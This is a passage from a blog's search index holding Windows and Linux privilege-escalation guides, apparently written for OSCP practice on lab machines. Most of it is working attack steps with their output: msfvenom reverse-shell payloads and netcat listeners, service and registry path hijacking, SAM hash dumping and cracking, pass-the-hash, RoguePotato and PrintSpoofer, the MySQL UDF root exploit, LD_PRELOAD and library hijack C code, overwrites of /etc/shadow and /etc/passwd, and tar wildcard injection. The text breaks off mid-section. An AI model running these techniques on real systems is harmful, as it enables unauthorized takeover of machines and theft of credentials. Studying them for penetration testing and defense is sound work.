[{"categories":["OSCP"],"content":"Here I will explain about privilege escalate in Window machine.","date":"2021-05-03","objectID":"/windowsprivsec/","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Let’s make hands dry in Windows Privilege Escalation. In order to deploy windows machine in linux we require xfreerdp or remminatool along with username and password. For xfreerdp root@gr4n173:~$ xfreerdp /u:user /p:password321 /cert:ignore /v:10.10.13.134 For remmina We have can run directly a tool and login with username and password. ","date":"2021-05-03","objectID":"/windowsprivsec/:0:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"1. Generate a Reverse Shell Executable On Kali machine we can use msfvenom to generate the reverse shell executables root@gr4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.156 LPORT=53 -f exe -o reverse.exe [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of exe file: 7168 bytes Saved as: reverse.exe From here to transfer this executable to windows, we can setup a Simple SMB Server of python in linux. Linux root@gr4n173:~$ sudo python3 /usr/share/doc/python3-impacket/examples/smbserver.py gr4n173 . Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed In Window C:\\User\u003e copy \\\\10.10.14.156\\gr4n173\\reverse.exe C:\\User\\reverse.exe Now our task is to run the reverse shell executables in window to get the connection back before that we have to setup netcat listner on linux. root@gr4n173:~$ nc -lvnp 53 listening on [any] 53 ... connect to [10.2.77.175] from (UNKNOWN) [10.10.130.32] 49795 Microsoft Windows [Version 10.0.17763.737] (c) 2018 Microsoft Corporation. All rights reserved. C:\\User\u003ewhoami whoami gr4n173\\user This way we can get the reverse connection in linux of window machine. ","date":"2021-05-03","objectID":"/windowsprivsec/:1:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"2. Service Exploits #service ","date":"2021-05-03","objectID":"/windowsprivsec/:2:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Insecure Service Permissions #bin_path On Windows machine, when escalating our privileges we go through the service that run under system privileges. Here services are like binary executables in linux. So inorder to execute our services we require the services to restart. Before going deep dive into service exploit let’s try to check the services are run by user for that we use accesschk.exe . Download accesschk.exe AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects etc. #This give the detail about services that we have read/write permission C:\\gr4n173\\accesschk.exe -uwcqv user * RW daclsvc SERVICE_QUERY_STATUS SERVICE_QUERY_CONFIG SERVICE_CHANGE_CONFIG SERVICE_INTERROGATE SERVICE_ENUMERATE_DEPENDENTS SERVICE_START SERVICE_STOP READ_CONTROL Permissions Use of the services SRVICE_CHANGE_CONFIG Can reconfigure the service binary WRITE_DAC Can reconfigure permissions, leading to SERVICE_CHANGE_CONFIG WRITE_OWNER Can become owner, reconfigure permissions GENERIC_WRITE Inherits SERVICE_CHANGE_CONFIG GENERIC_ALL Inherits SERVICE_CHANGE_CONFIG Now inorder to check under what privileges a system runs. For that we check for specific service daclsvc. C:\\gr4n173\u003e sc qc daclsvc SERVICE_NAME: daclsvc TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\DACL Service\\daclservice.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : DACL Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem where:- sc: Service Sontroller qc: query configuration Now inorder exploit that service we have to change the Binpath of service daclsvc with the path of our reverse.exe. C:\\gr4n173\u003e sc config daclsvc binpath=\"\\\"C:\\gr4n173\\reverse.exe\\\"\" [SC] ChangeServiceConfig SUCCESS Since binpath is changed now we only have to do is run the service again along with listner set in linux and we are in. C:\\gr4n173\u003e net start daclsvc The service is not responding to the control function. More help is available by typing NET HELPMSG 2186. Linux root@gr4n173~$ nc -lvnp 53 listening on [any] 53 ... connect to [10.2.77.175] from (UNKNOWN) [10.10.75.7] 49882 Microsoft Windows [Version 10.0.17763.737] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami nt authority\\system C:\\Windows\\system32\u003e ","date":"2021-05-03","objectID":"/windowsprivsec/:2:1","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Unquoted Service Path #unquotedsvc Basically if path to the service binary isn’t wrapped in quotes and there are spaces in the path then we can escalate privileges by abusing misconfigured services. For ex:- If we use long file name that contains a space, use quoted strings indicate where file ends ;otherwise, the filename isn’t ambiguous. string “C:\\program files\\testing service\\unquoted Service “. Unquotedsvc can be checked as C:\\gr4n173\u003esc qc unquotedsvc SERVICE_NAME: unquotedsvc TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : C:\\Program Files\\Unquoted Path Service\\Common Files\\unquotedpathservice.exe LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Unquoted Path Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem From there we can see the bin_path is unquoted and contain the spaces. Now in order to exploit that first we have to check who can rw that directory. C:\\grn4713\u003eC:\\gr4n173\\accesschk.exe /accepteula -uwdq \"C:\\Program Files\\Unquoted Path Service\\Common Files\\\" C:\\Program Files\\Unquoted Path Service Medium Mandatory Level (Default) [No-Write-Up] RW BUILTIN\\Users RW NT SERVICE\\TrustedInstaller RW NT AUTHORITY\\SYSTEM RW BUILTIN\\Administrators Now copying our reverse.exe executables in this directory and rename it to Common.exe. Since unquotedservice run the common file everytime. C:\\gr4n173\u003ecopy C:\\gr4n173\\reverse.exe \"C:\\Program Files\\Unquoted Path Service\\Common.exe\" This way we got the reverse connection in linux listner same as above. ","date":"2021-05-03","objectID":"/windowsprivsec/:2:2","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Week Registry Permissions #regsvc Now next service is the registry service i.e regsvc. Windows regisry also have ACL(Access Control List) and stores entries for each service in the machine. So if ACL is misconfigured then we can exploit it. C:\\gr4n173\u003esc qc regsvc [SC] QueryServiceConfig SUCCESS SERVICE_NAME: regsvc TYPE : 10 WIN32_OWN_PROCESS START_TYPE : 3 DEMAND_START ERROR_CONTROL : 1 NORMAL BINARY_PATH_NAME : \"C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\" LOAD_ORDER_GROUP : TAG : 0 DISPLAY_NAME : Insecure Registry Service DEPENDENCIES : SERVICE_START_NAME : LocalSystem From there we can see the insecure registry location. We can find the location of regsvc using winpeas.exe. Now we have to check the permission on this service and found that user NT AUTHORITY\\INTERACTIVE have rw permission. C:\\gr4n173\\accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\regsvc Medium Mandatory Level (Default) [No-Write-Up] RW NT AUTHORITY\\SYSTEM KEY_ALL_ACCESS RW BUILTIN\\Administrators KEY_ALL_ACCESS RW NT AUTHORITY\\INTERACTIVE KEY_ALL_ACCESS So inorder to exploit this we have to change the directory of ImagePath. Before that let’s query this registry. C:\\gr4n173\u003ereg query HKLM\\System\\CurrentControlSet\\Services\\regsvc HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\regsvc Type REG_DWORD 0x10 Start REG_DWORD 0x3 ErrorControl REG_DWORD 0x1 ImagePath REG_EXPAND_SZ \"C:\\Program Files\\Insecure Registry Service\\insecureregistryservice.exe\" DisplayName REG_SZ Insecure Registry Service ObjectName REG_SZ LocalSystem HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\regsvc\\Security From there you can see the ImagePath location pointing to insecure registry. Let’s change the path. C:\\gr4n173\u003ereg add HKLM\\SYSTEM\\CurrentControlSet\\services\\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\\PrivEsc\\reverse.exe /f The operation completed successfully. Where: /v: The value name, under the selected Key, to add. /t: RegKey data types [ REG_SZ | REG_MULTI_SZ | REG_EXPAND_SZ | REG_DWORD | REG_QWORD | REG_BINARY | REG_NONE ] If omitted, REG_SZ is assumed. /d: The data to assign to the registry ValueName being added. /f: Force overwriting the existing registry entry without prompt. Hence by starting regsvc we get the reverse shell conection in linux same as above. ","date":"2021-05-03","objectID":"/windowsprivsec/:2:3","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Insecure Service Executables Here we will be exploiting filepermsvc service which can be done same as other service i.e. by changing the bin_path directory with the directory of our reverse.exe. C:\\gr4n173\u003esc qc filepermsvc Using accesschk.exe, note that the service binary (BINARY_PATH_NAME) file is writable by everyone: C:\\gr4n173\\accesschk.exe /accepteula -quvw \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" Copy the reverse.exe executable you created and replace the filepermservice.exe with it: C:\\gr4n173\u003ecopy C:\\gr4n173\\reverse.exe \"C:\\Program Files\\File Permissions Service\\filepermservice.exe\" /Y Start a listener on linux and then start the service to spawn a reverse shell running with SYSTEM privileges: C:\\gr4n173\u003enet start filepermsvc ","date":"2021-05-03","objectID":"/windowsprivsec/:2:4","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"3. Registry ","date":"2021-05-03","objectID":"/windowsprivsec/:3:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"AutoRuns Query the registry for AutoRun executables: C:\\gr4n173\u003ereg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run Using accesschk.exe, note that one of the AutoRun executables is writable by everyone: C:\\gr4n173\\accesschk.exe /accepteula -wvu \"C:\\Program Files\\Autorun Program\\program.exe\" Copy the reverse.exe executable you created and overwrite the AutoRun executable with it: C:\\gr4n173\u003ecopy C:\\gr4n173\\reverse.exe \"C:\\Program Files\\Autorun Program\\program.exe\" /Y Start a listener on Kali and then restart the Windows VM. Open up a new RDP session to trigger a reverse shell running with admin privileges. You should not have to authenticate to trigger it, however if the payload does not fire, log in as an admin (admin/password123) to trigger it. Note that in a real world engagement, you would have to wait for an administrator to log in themselves! rdesktop 10.10.107.23 ","date":"2021-05-03","objectID":"/windowsprivsec/:3:1","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"AlwaysInstallElevated When AlwaysInstallElevated is set for both HKLM(HKEY\\_LOCAL\\_MACHINE) and HKCU(_HKEY\\_CURRENT\\_USER_) in registry for every install program then, program automatically obtains system privileges. And another thing i.e. Windows environment provide a group policy settings which allows a regular user to install a Microsoft Windows Installer Package(MSI) with system privileges. So from that prospective, here we have to set the both HKLMand HKCU then we can get the system. For that we have to query registry first. C:\\gr4n173\u003ereg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 C:\\gr4n173\u003ereg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer AlwaysInstallElevated REG_DWORD 0x1 Here both are set. Now our task is to install reverseshell as msi package for that we can use msfvenom and then transfer it to windows machine using smb server. root@g4n173:~$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.2.77.175 LPORT=53 -f msi -o reverse.msi [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x64 from the payload No encoder specified, outputting raw payload Payload size: 460 bytes Final size of msi file: 159744 bytes Saved as: reverse.msi Now, it has been transfered to windows and if we try to run it with a listner on in kali then we get the shell with SYSTEM privileges. C:\\gr4n173\u003emsiexec /quite /qn /i reverse.msi ","date":"2021-05-03","objectID":"/windowsprivsec/:3:2","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"4. Passwords ","date":"2021-05-03","objectID":"/windowsprivsec/:4:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Registry We can search for the keys and values that contains word ‘password’ in registry using C:\\gr4n173\u003ereg query HKLM /f password /t REG_SZ /s C:\\gr4n173\u003ereg query HKCU /f password /t REG_SZ /s ....... HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\DefaultUserConfiguration Password REG_SZ HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp Password REG_SZ HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\RemoteAccess\\Policy\\Pipeline\\23 (Default) REG_SZ IAS.ChangePassword End of search: 258 match(es) found. To query for windows autologin which will display password and username C:\\gr4n173\u003ereg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultUsername C:\\gr4n173\u003ereg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v DefaultPassword Now if we got the creds of admin then we can login using winexe in kali machine which is same as ssh in linux with creds. root@gr4n173:~$ winexe -U 'admin%password' //10.10.26.193 cmd.exe c) 2018 Microsoft Corporation. All rights reserved. C:\\Windows\\system32\u003ewhoami whoami win-qba94kb3iof\\admin ","date":"2021-05-03","objectID":"/windowsprivsec/:4:1","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Saved Creds If we got the saved creds in windows machine then we can get the reverse connection using savedcred To search for saved credentials C:\\gr4n173\u003ecmdkey /list Currently stored credentials: Target: WindowsLive:target=virtualapp/didlogical Type: Generic User: 02nfpgrklkitqatu Local machine persistence Target: Domain:interactive=WIN-QBA94KB3IOF\\admin Type: Domain Password User: WIN-QBA94KB3IOF\\admin This indicate admin users creds is saved. Now to get the reverse connection we can runas with listner on in linux. C:\\gr4n173\u003erunas /savecred /user:admin C:\\PrivEsc\\reverse.exe Note: If you want to create the saved credential list in windows then we can use the following command. C:\\gr4n173\u003e cmdkey /add:vulnerabl-pc /user:gr4n173 /pass:password For more info: visit here cmdkey. ","date":"2021-05-03","objectID":"/windowsprivsec/:4:2","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Security Account Manager (SAM) Basically Windows user password hashes can be extracted using SAM and SYSTEM files. In order to transfer files from windows machine to linux we can use same smb server and use copy command as C:\\gr4n173\u003ecopy FILENAME \\IP_address_of_linux\\gr4n173\\ C:\\gr4n173\u003ecopy SAM \\\\10.2.77.175\\gr4n173 Now to after transfer of files into linux machine we can download creddump7 to dump out the hashes. You can download creddump7. root@gr4n173:~$ python3 creddump7/pwdump.py SYSTEM SAM Administrator:500:aad3b435b51404eeaad3b435b51404ee:hashes over here::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:6ebaa6d5e6e601996eefe4b6048834c2::: user:1000:aad3b435b51404eeaad3b435b51404ee:91ef1073f6ae95f5ea6ace91c09a963a::: admin:1001:aad3b435b51404eeaad3b435b51404ee:hashes overhere::: Then after getting hashes we can crack the password using hashcat root@gr4n173:~$ hashcat -m 1000 --force a9fdfa038c4b75ebc76dc855dd74f0da /usr/share/wordlist/rockyou.txt ","date":"2021-05-03","objectID":"/windowsprivsec/:4:3","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Passing the Hash Kali Linux have a tool which allow to login using the username/passwordhash called pth-winexe and spawn a shell running as admin root@gr4n173:~$ pth-winexe -U 'admin%hash_over_here' //10.10.26.193 cmd.exe ","date":"2021-05-03","objectID":"/windowsprivsec/:4:4","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"5. Scheduled Tasks As in linux we use cronjob for scheduled tasks but here in Windows we can use cleanup.ps1 script. This tools usually cleanup but only thing is it need to be run by SYSTEM. Download here. To cat the file in windows we can use type command and can see it is run by SYSTEM. C:\\DevTools\u003etype CleanUp.ps1 # This script will clean up all your old dev logs every minute. # To avoid permissions issues, run as SYSTEM (should probably fix this later) Remove-Item C:\\DevTools\\*.log Now our task is to replace cleanup.ps1 script with reverse.exe. Then after certain time we can get the shell with listner on in linux. C:\\gr4n173\u003e echo C:\\gr4n173\\reverse.exe \u003e\u003e C:\\gr4n173\\CleanUp.ps1 ","date":"2021-05-03","objectID":"/windowsprivsec/:5:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"6. Startup Apps Using accesschk.exe, note that the BUILTIN\\Users group can write files to the StartUp directory: C:\\gr4n173\u003e accesschk.exe /accepteula -d \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\" Using cscript, run the C:\\PrivEsc\\CreateShortcut.vbs script which should create a new shortcut to your reverse.exe executable in the StartUp directory: C:\\gr4n173\u003ecscript CreateShortcut.vbs Start a listener on Kali, and then simulate an admin logon using RDP and the credentials you previously extracted: root@gr4n173:~$ rdesktop -u admin 10.10.8.98 A shell running as admin should connect back to your listener. ","date":"2021-05-03","objectID":"/windowsprivsec/:6:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"7.Token Impersonation ","date":"2021-05-03","objectID":"/windowsprivsec/:7:0","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Rogue Potato Here we abused SeImpersonate or SeAssignPrimaryToken privileges to get execution as SYSTEM using roguePotato exploit. When we require more than 2 shell of windows in different port then we can use RoguePotato exploit. At first we have to port forward in kali which can be done using socat. root@gr4n173:~$ sudo socat tcp-listen:135,reuseaddr,fork tcp:10.10.8.98:9999 PsExec.exehelps to execute the process remotely. Now in order to run PSExec.exewe require administrator privilege. So we can click on run-\u003eas administrator while opening cmd. Then only we can run the below command. Using PSExec64.exe to trigger the reverse.exe executable with the permissions of the “local service” account: C:\\gr4n173\u003eC:\\PrivEsc\\PSExec64.exe -i -u \"nt authority\\local service\" C:\\PrivEsc\\reverse.exe Now again starting new listner on kali. Then, in the “local service” reverse shell you triggered, run the RoguePotato exploit to trigger a second reverse shell running with SYSTEM privileges: C:\\gr4n173\u003e C:\\gr4n173\\RoguePotato.exe -r 10.10.10.10 -e \"C:\\gr4n173\\reverse.exe\" -l 9999 For more info: 0xdf blog ","date":"2021-05-03","objectID":"/windowsprivsec/:7:1","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"PrintSpoofer Here we use PrintSpoofer exploit to trigger a second shell as same in RoguePotato exploit. Setting permissions of the “local serivce” account same as in above. Now running the PrintSpoofer exploit as C:\\gr4n173\u003eC:\\gr4n173\\PrintSpoofer.exe -c \"C:\\gr4n173\\reverse.exe\" -i This way we get the reverse shell with SYSTEM privileges. Resources: Several tools have been written which help find potential privilege escalations on Windows. Among of them are writeen below. winPEASany.exe Seatbelt.exe PowerUp.ps1 SharpUp.exe. For more Windows Escalation Technique: payloadsallthings guif.re. Script_and_payloads_by_Nishang ","date":"2021-05-03","objectID":"/windowsprivsec/:7:2","tags":["windows","privilege Escalation"],"title":"Windows Privilege Escalation Guide","uri":"/windowsprivsec/"},{"categories":["OSCP"],"content":"Here I will explain about ways to escalate to root user.","date":"2021-05-02","objectID":"/linuxprivsec/","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Lets talk about the ways to linux privilege escalate from non-user by exploit executables. Links: https://medium.com/malware-buddy/security-infographics-9c4d3bd891ef#18dd https://github.com/sagishahar/lpeworkshop ","date":"2021-05-02","objectID":"/linuxprivsec/:0:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"1. Service Exploits ","date":"2021-05-02","objectID":"/linuxprivsec/:1:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"mysql Using the exploit from exploit db to get the rootshell. Since mysql is run by root without password where we can create the tables and run the command using function. The MySQL service is running as root and the “root” user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service. Change into the /home/user/tools/mysql-udf directory: root@gr4n173:~$ cd /home/user/tools/mysql-udf Compile the raptor_udf2.c exploit code using the following commands: root@gr4n173:~$ gcc -g -c raptor_udf2.c -fPIC root@gr4n173:~$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc Connect to the MySQL service as the root user with a blank password: root@gr4n173:~$ mysql -u root Execute the following commands on the MySQL shell to create a User Defined Function (UDF) \"do_system\" using our compiled exploit: mysql\u003e use mysql; mysql\u003e create table foo(line blob); mysql\u003e insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so')); mysql\u003e select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so'; mysql\u003e create function do_system returns integer soname 'raptor_udf2.so'; Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission: mysql\u003e select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash'); Exit out of the MySQL shell (type exit or \\q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges: root@gr4n173:~$ /tmp/rootbash -p ","date":"2021-05-02","objectID":"/linuxprivsec/:1:1","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"2. Week file permission ","date":"2021-05-02","objectID":"/linuxprivsec/:2:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Readable #/etc/shadow Here I will be exploiting the shadow file which have read permission. At first I have check the permission of shadow file. root@gr4n173:~$ ls -al /etc/shadow -rw-r--rw- 1 root shadow 845 May 2 03:41 /etc/shadow There you can see the rw permission to others. So I have read the shadow file and collected the hash of root user. root@gr4n173:~$ cat /etc/shadow root:Hashesh over here :0:99999:7::: daemon:*:17298:0:99999:7::: bin:*:17298:0:99999:7::: sys:*:17298:0:99999:7::: sync:*:17298:0:99999:7::: games:*:17298:0:99999:7::: man:*:17298:0:99999:7::: Now after collecting hash I have used john to crack the hash using rockyou password wordlist. root@gr4n173:~$ john --wordlists=/usr/share/rockyou.txt hash ","date":"2021-05-02","objectID":"/linuxprivsec/:2:1","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Writable /etc/shadow For the week file permission I have created the new hash of newpassword using mkpasswd tool in kali linux. root@gr4n173:~$ mkpasswd -m sha-512 passwordhere $6$gdvluNMatnPMjy7r$1oYL8zHY7vcNAQM1QLtoVN8V6cwKIbmXuWoft3fjwS4hPy.ZOOENIs66T6M7IitJeH9U6x3MKi8lJJp7FDifI. Now generated password can be replaced with the hash of root user and then we can login using the same password as a root. ","date":"2021-05-02","objectID":"/linuxprivsec/:2:2","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Writable #/etc/passwd For this we can create the new hash of newpassword using openssl tool root@gr4n173:~$ openssl passwd newpassword Warning: truncating password to 8 characters xuMbZmFpJEH/s Then pasting this hash in /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user’s row (replacing the “x”). ","date":"2021-05-02","objectID":"/linuxprivsec/:2:3","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"3. Shell Escape Sequences #Sudo Basically we encounter many program which is run by root user so for that we can use the GTFOBins. Using instructions in GTFOBins we can get the root shell. From here I got the list of program which can be used the shell escape sequences but apache2 can’t be shell escape so for that we can use the environment variable things. ","date":"2021-05-02","objectID":"/linuxprivsec/:3:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"4. Sudo Environment Variables $code for preload environment #include \u003cstdio.h\u003e#include \u003csys/types.h\u003e#include \u003cstdlib.h\u003e void _init() { unsetenv(\"LD_PRELOAD\"); setresuid(0,0,0); system(\"/bin/bash -p\"); } Sudo can be configured to inherit certain environment variables from the user’s environment. Check which environment variables are inherited (look for the env_keep options): sudo -l LD\\_PRELOAD and LD\\_LIBRARY\\_PATH are both inherited from the user’s environment. LD\\_PRELOAD loads a shared object before any others when a program is run. LD\\_LIBRARY\\_PATH provides a list of directories where shared libraries are searched for first. Create a shared object using the code located at /home/user/tools/sudo/preload.c: root@gr4n173:~$ gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c Run one of the programs you are allowed to run via sudo (listed when running sudo -l), while setting the LD_PRELOAD environment variable to the full path of the new shared object: root@gr4n173:~$ sudo LD_PRELOAD=/tmp/preload.so program-name-here A root shell should spawn. Exit out of the shell before continuing. Depending on the program you chose, you may need to exit out of this as well. Run ldd against the apache2 program file to see which shared libraries are used by the program: root@gr4n173:~$ ldd /usr/sbin/apache2 Create a shared object with the same name as one of the listed libraries (libcrypt.so.1) using the code located at /home/user/tools/sudo/library_path.c: $Code for library path #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e static void hijack() __attribute__((constructor)); void hijack() { unsetenv(\"LD_LIBRARY_PATH\"); setresuid(0,0,0); system(\"/bin/bash -p\"); } root@gr4n173:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c Run apache2 using sudo, while settings the LD_LIBRARY_PATH environment variable to /tmp (where we output the compiled shared object): root@gr4n173:~$ sudo LD_LIBRARY_PATH=/tmp apache2 A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1 to the name of another library used by apache2 and re-run apache2 using sudo again. ","date":"2021-05-02","objectID":"/linuxprivsec/:4:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"5. Cron Jobs ","date":"2021-05-02","objectID":"/linuxprivsec/:5:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Environment Variable view the contents of the system-wide crontab: cat /etc/crontab Note: the PATH variable starts with /home/users which is our user’s home directory PATH=/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin #!/bin/bash cp /bin/bash /tmp/rootbash chmod +xs /tmp/rootbash Now giving the permission to overwrite.sh file as +x so that crontab run everytime. ","date":"2021-05-02","objectID":"/linuxprivsec/:5:1","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Wildcards If any command is run with a wildcard(*) in home directory then we can use wildcard bypass technique in cron job. For that we have to generate the reverse_shell and then used shell to break out from restricted environments by spawing an interactive system shell. generate the shell root@gr4n173:~$ msfvenom -p linux/x64/reverse_tcp LHOST=10.10.14.175 -f elf -o shell.elf Now we have to copy this file to the remote/vulnerable machine that can be done using scp. root@gr4n173:~$ scp /home/localuser/filename remoteuser@ipaddress:/home/user/ After shell.elf is downloaded to vulnerable box then set the permission over there. root@gr4n173:~$ chmod +x /home/user/shell.elf Create these two files in /home/user: root@gr4n173:~$ touch /home/user/--checkpoint=1 root@gr4n173:~$ touch /home/user/--checkpoint-action=exec=shell.elf When the tar command in the cron job runs, the wildcard (*) will expand to include these files. Since their filenames are valid tar command line options, tar will recognize them as such and treat them as command line options rather than filenames. Now final part is to set the listner in local machine then you can get the shell after certain minute. ","date":"2021-05-02","objectID":"/linuxprivsec/:5:2","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"5. SUID/SGID Executables ","date":"2021-05-02","objectID":"/linuxprivsec/:6:0","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Known Exploits Inorder to find all the SUID/SGID executables on debian we can run root@gr4n173:~$ find / -perm -u=s -type f 2\u003e /dev/null Then after this we can search the exploit related to the version of executables then get the root shell. ","date":"2021-05-02","objectID":"/linuxprivsec/:6:1","tags":["linux"],"title":"Linux Privilege Escalation Guide","uri":"/linuxprivsec/"},{"categories":["OSCP"],"content":"Shared Object Injection $ shared object injection C code libcalc.c #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e static void inject() __attribute__((constructor)); void inject() { setuid(0); system(\"/bin/bash -p\"); } At first we have to identify the executables and vulnerable to shared object injection. For this we use the same technique with find and the strace the so file root@gr4n173:~$ 